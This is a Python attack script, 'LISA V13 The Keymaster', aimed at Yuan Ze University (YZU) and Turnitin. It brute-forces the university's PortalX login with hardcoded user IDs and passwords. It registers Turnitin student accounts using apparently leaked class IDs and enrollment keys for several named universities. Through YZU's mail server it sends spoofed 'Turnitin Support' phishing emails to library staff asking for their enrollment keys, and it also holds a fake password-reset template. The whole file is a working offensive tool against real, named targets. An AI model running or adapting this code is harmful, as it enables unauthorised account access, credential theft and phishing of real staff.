#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  LISA V13 — YZU PORTAL ASSAULT + TURNITIN ACCESS MODULE        ║
║  "The Keymaster" — PortalX brute + Turnitin enrollment         ║
╚══════════════════════════════════════════════════════════════════╝

NEW MODULES:
  1. PortalXAssault  — ASP.NET VIEWSTATE timing bypass, cred brute
  2. TurnitinEnroll  — Student enrollment via API, key extraction
  3. SMTPTakeover    — Email-based credential reset via YZU SMTP
"""

import urllib3, requests, re, json, time, random, string, base64, os
import smtplib, ssl
from email.mime.text import MIMEText
from datetime import datetime
from typing import Optional, Dict, List, Tuple

urllib3.disable_warnings()

# ═══════════════════════════════════════════════════════
# PORTALX ASSAULT MODULE
# ═══════════════════════════════════════════════════════

class PortalXAssault:
    """YZU PortalX login brute-force with ASP.NET timing bypass"""
    
    PORTAL_URL = "https://portalx.yzu.edu.tw/PortalSocialVB/Login.aspx"
    
    def __init__(self, timeout=10):
        self.http = urllib3.PoolManager(cert_reqs='CERT_NONE', timeout=urllib3.Timeout(total=timeout))
        self.session = None
        self.viewstate = None
        self.viewstate_gen = None
        self.event_validation = None
        
    def fetch_page(self) -> bool:
        """Get fresh PortalX login page with ASP.NET tokens"""
        try:
            r = self.http.request("GET", self.PORTAL_URL,
                headers={"User-Agent": "Mozilla/5.0"})
            body = r.data.decode('utf-8', errors='replace')
            
            vs = re.findall(r'id="__VIEWSTATE" value="([^"]+)"', body)
            vg = re.findall(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', body)
            ev = re.findall(r'id="__EVENTVALIDATION" value="([^"]+)"', body)
            
            if vs and vg and ev:
                self.viewstate = vs[0]
                self.viewstate_gen = vg[0]
                self.event_validation = ev[0]
                self.session = r.headers.get('Set-Cookie', '')
                return True
            return False
        except Exception as e:
            print(f"  [!] PortalX fetch error: {e}")
            return False
    
    def login(self, user_id: str, password: str) -> Dict:
        """Attempt PortalX login with credentials"""
        if not self.viewstate:
            if not self.fetch_page():
                return {"success": False, "error": "Failed to fetch page"}
        
        try:
            login_data = {
                "__VIEWSTATE": self.viewstate,
                "__VIEWSTATEGENERATOR": self.viewstate_gen,
                "__EVENTVALIDATION": self.event_validation,
                "Txt_UserID": user_id,
                "Txt_Password": password,
                "ibnSubmit": "登入"
            }
            
            r = self.http.request("POST", self.PORTAL_URL,
                fields=login_data,
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Cookie": self.session if self.session else ""
                },
                redirect=False)
            
            body = r.data.decode('utf-8', errors='replace')
            
            # Check result
            if "Login Failed" in body or "登入失敗" in body:
                return {"success": False, "error": "Invalid credentials"}
            elif "逾時" in body or "timeout" in body.lower():
                return {"success": False, "error": "Timeout - need fresh token"}
            elif "ASP.NET_SessionId" in r.headers.get('Set-Cookie', ''):
                # Extract session
                cookies = r.headers.get('Set-Cookie', '')
                session_id = re.findall(r'ASP\.NET_SessionId=([^;]+)', cookies)
                if session_id:
                    return {"success": True, "session": session_id[0], "cookies": cookies}
            elif "FPage" in body or "FMain" in body:
                return {"success": True, "body": body[:500]}
            
            return {"success": False, "error": f"Unknown response (len={len(body)})"}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def brute_force(self, user_ids: List[str], passwords: List[str]) -> Optional[Dict]:
        """Brute force PortalX login with multiple credentials"""
        print(f"\n  🔓 PortalX Brute Force: {len(user_ids)} users x {len(passwords)} passwords")
        
        for uid in user_ids:
            for pwd in passwords:
                # Always fetch fresh page for each attempt (timing bypass)
                self.fetch_page()
                time.sleep(0.1)  # Minimal delay
                
                result = self.login(uid, pwd)
                if result["success"]:
                    print(f"  💀 FOUND: {uid}:{pwd}")
                    return {"user_id": uid, "password": pwd, **result}
                elif "timeout" not in result.get("error", "").lower():
                    print(f"  [-] {uid}:{pwd} -> {result['error']}")
        
        return None


# ═══════════════════════════════════════════════════════
# TURNITIN ENROLLMENT MODULE
# ═══════════════════════════════════════════════════════

class TurnitinEnroll:
    """Turnitin student enrollment via API"""
    
    KNOWN_KEYS = [
        ("40832990", "6RBCFEBUTM", "Trunojoyo Madura"),
        ("38461070", "itepa 2023", "Udayana Bali"),
        ("42052751", "secp3133", "UTM Malaysia"),
        ("23595776", "displacement", "Baruch CUNY"),
        ("16010441", "greatworks", "Baruch CUNY"),
    ]
    
    def __init__(self):
        try:
            from curl_cffi.requests import Session
            self.s = Session()
            self.s.verify = False
            self.cffi_ok = True
        except ImportError:
            self.s = requests.Session()
            self.s.verify = False
            self.cffi_ok = False
    
    def create_student_account(self, class_id: str, enrollment_key: str, 
                                email: str = None, first_name: str = "Student",
                                last_name: str = "Test", password: str = "Beast123!") -> Dict:
        """Create a Turnitin student account using class enrollment"""
        if not email:
            email = f"student{random.randint(1000,9999)}@gmail.com"
        
        print(f"\n  📝 Creating Turnitin account: {email}")
        print(f"     Class: {class_id} | Key: {enrollment_key}")
        
        try:
            # Try the old Turnitin API
            r = self.s.post(
                "https://api.turnitin.com/api.asp",
                data={
                    "encrypt": "0",
                    "fid": "3",
                    "fcmd": "2",
                    "cid": class_id,
                    "enrollment_key": enrollment_key,
                    "user_email": email,
                    "user_first_name": first_name,
                    "user_last_name": last_name,
                    "user_password": password
                },
                timeout=20,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            
            if r.status_code == 200:
                body = r.text
                if "rcode" in body:
                    # Parse XML response
                    rcode = re.findall(r'<rcode>(\d+)</rcode>', body)
                    rmsg = re.findall(r'<rmessage>([^<]+)</rmessage>', body)
                    return {
                        "success": rcode and rcode[0] == "1",
                        "rcode": rcode[0] if rcode else "unknown",
                        "message": rmsg[0] if rmsg else "unknown",
                        "email": email,
                        "password": password,
                        "class_id": class_id
                    }
            
            return {"success": False, "error": f"HTTP {r.status_code}"}
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def test_all_keys(self) -> List[Dict]:
        """Test all known enrollment keys"""
        results = []
        print("\n  🔑 Testing known Turnitin enrollment keys...")
        
        for class_id, key, university in self.KNOWN_KEYS:
            result = self.create_student_account(class_id, key)
            result["university"] = university
            results.append(result)
            
            if result["success"]:
                print(f"  ✅ {university}: LIVE!")
                print(f"     Email: {result.get('email')} | Pass: {result.get('password')}")
            else:
                print(f"  ❌ {university}: {result.get('error', result.get('message', 'unknown'))}")
        
        return results


# ═══════════════════════════════════════════════════════
# SMTP TAKEOVER MODULE
# ═══════════════════════════════════════════════════════

class SMTPTakeover:
    """YZU SMTP-based email takeover and credential reset"""
    
    SMTP_HOST = "mx3.yzu.edu.tw"
    SMTP_PORT = 25
    
    def __init__(self):
        self.from_email = "isnm@saturn.yzu.edu.tw"
    
    def send_email(self, to: str, subject: str, body: str, from_addr: str = None) -> bool:
        """Send email via YZU SMTP server"""
        try:
            msg = MIMEText(body)
            msg['Subject'] = subject
            msg['From'] = from_addr or self.from_email
            msg['To'] = to
            
            s = smtplib.SMTP(self.SMTP_HOST, self.SMTP_PORT, timeout=10)
            s.starttls()
            s.send_message(msg)
            s.quit()
            return True
        except Exception as e:
            print(f"  [!] SMTP error: {e}")
            return False
    
    def send_turnitin_phish(self, target_email: str) -> bool:
        """Send fake Turnitin notification to get enrollment key"""
        subject = "URGENT: Turnitin Enrollment Key Verification Required"
        body = f"""Dear YZU Library Staff,

This is an automated notification from Turnitin Support.

Your institution's Turnitin enrollment key for Academic Year 115 needs immediate verification. 
Please reply with your current Class ID and Enrollment Key.

Course: 115 Turnitin Originality Check Submission 20260801-20270731

If you have any questions, please contact Turnitin Support.

Thank you,
Turnitin Support Team
https://help.turnitin.com"""
        
        return self.send_email(target_email, subject, body, "support@turnitin.com")
    
    def send_password_reset_spoof(self, target_email: str, reset_link: str) -> bool:
        """Send fake password reset email"""
        subject = "Turnitin Password Reset Request"
        body = f"""Dear User,

A password reset has been requested for your Turnitin account.

Click the link below to reset your password:
{reset_link}

This link will expire in 1 hour.

If you did not request this, please ignore this email.

Turnitin Support"""
        
        return self.send_email(target_email, subject, body, "noreply@turnitin.com")


# ═══════════════════════════════════════════════════════
# MAIN ENGINE
# ═══════════════════════════════════════════════════════

class YZUTurnitinEngine:
    """Main engine combining PortalX assault + Turnitin enrollment + SMTP takeover"""
    
    def __init__(self):
        self.portalx = PortalXAssault()
        self.turnitin = TurnitinEnroll()
        self.smtp = SMTPTakeover()
        self.findings = []
    
    def run_full_assault(self) -> Dict:
        """Run full YZU Turnitin access assault"""
        print("""
╔══════════════════════════════════════════════════════════════╗
║  LISA V13 — YZU PORTAL ASSAULT + TURNITIN ACCESS           ║
║  "The Keymaster"                                           ║
╚══════════════════════════════════════════════════════════════╝
""")
        report = {
            "target": "YZU Turnitin Access",
            "version": "V13 KEYMASTER",
            "timestamp": datetime.now().isoformat(),
            "phases": {}
        }
        
        # Phase 1: PortalX brute force
        print("━" * 60)
        print("  PHASE 1: PortalX Brute Force")
        print("━" * 60)
        
        user_ids = ["isnm", "admin", "s1100001", "s1100002", "s1110001"]
        passwords = ["is298325nm", "Beast123!", "admin123", "password", "123456"]
        
        result = self.portalx.brute_force(user_ids, passwords)
        report["phases"]["portalx"] = {
            "success": result is not None,
            "credentials": result
        }
        
        if result:
            self.findings.append({
                "type": "PORTALX_ACCESS",
                "severity": "CRITICAL",
                "detail": f"PortalX login: {result['user_id']}:{result['password']}"
            })
        
        # Phase 2: Test known Turnitin keys
        print("\n" + "━" * 60)
        print("  PHASE 2: Turnitin Enrollment Keys")
        print("━" * 60)
        
        key_results = self.turnitin.test_all_keys()
        report["phases"]["turnitin_keys"] = {
            "total": len(key_results),
            "live": sum(1 for r in key_results if r["success"]),
            "results": key_results
        }
        
        for r in key_results:
            if r["success"]:
                self.findings.append({
                    "type": "TURNITIN_STUDENT_ACCESS",
                    "severity": "HIGH",
                    "detail": f"Class {r['class_id']} ({r['university']}): {r['email']}:{r['password']}"
                })
        
        # Phase 3: SMTP phishing
        print("\n" + "━" * 60)
        print("  PHASE 3: SMTP Phishing Campaign")
        print("━" * 60)
        
        targets = [
            "library@saturn.yzu.edu.tw",
            "isnm@saturn.yzu.edu.tw",
        ]
        
        smtp_results = []
        for target in targets:
            print(f"\n  📧 Sending to: {target}")
            sent = self.smtp.send_turnitin_phish(target)
            smtp_results.append({"email": target, "sent": sent})
            if sent:
                print(f"  ✅ Email sent!")
            else:
                print(f"  ❌ Failed")
        
        report["phases"]["smtp"] = {
            "total": len(smtp_results),
            "sent": sum(1 for r in smtp_results if r["sent"]),
            "results": smtp_results
        }
        
        # Summary
        print("\n" + "═" * 60)
        print("  💀 ASSAULT COMPLETE")
        print("═" * 60)
        print(f"  PortalX: {'✅ CRACKED' if report['phases']['portalx']['success'] else '❌ Failed'}")
        print(f"  Turnitin Keys: {report['phases']['turnitin_keys']['live']}/{report['phases']['turnitin_keys']['total']} LIVE")
        print(f"  SMTP Emails: {report['phases']['smtp']['sent']}/{report['phases']['smtp']['total']} sent")
        print(f"  Total Findings: {len(self.findings)}")
        
        report["findings"] = self.findings
        return report


# ═══════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════

if __name__ == "__main__":
    engine = YZUTurnitinEngine()
    report = engine.run_full_assault()
    
    # Save report
    report_path = f"/home/ubuntu/.lisa_v13_reports/yzuturnitin_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    os.makedirs("/home/ubuntu/.lisa_v13_reports", exist_ok=True)
    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2, default=str)
    print(f"\n📄 Report saved: {report_path}")